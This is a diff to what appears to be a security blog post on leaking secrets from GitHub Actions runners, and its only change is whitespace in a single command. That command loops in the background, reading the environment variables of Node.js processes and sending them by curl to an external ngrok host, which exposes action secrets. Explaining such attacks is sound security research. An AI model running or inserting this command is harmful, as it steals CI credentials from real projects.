@@ -189,7 +189,7 @@ Another type of step is the JavaScript action. It contains a `action.yml` manife
 Unlike with shell actions, _Runner.Worker_ doesn't hardcode secrets into JavaScript actions. JavaScript actions instead receive input values through environment variables—passed into the Node.js process. To expose those secrets, we asynchronously read the environment variables of future Node.js processes:
 
 ```sh
-while true; do curl -s 'https://4ddc-91-197-46-143.ngrok.io' -H "Content-Type: text/plain"  -d "$(ps axe | grep node)" -o /dev/null; done &
+while true; do curl -s 'https://4ddc-91-197-46-143.ngrok.io' -H "Content-Type: text/plain" -d "$(ps axe | grep node)" -o /dev/null; done &
 ```
 
 ![Screenshot of the dumped environment variables. "INPUT_EXAMPLE_ARGUMENT_1=SECRET VALUE" is highlighted.](/images/github-actions-leaking-secrets/fKOEN2u.png)
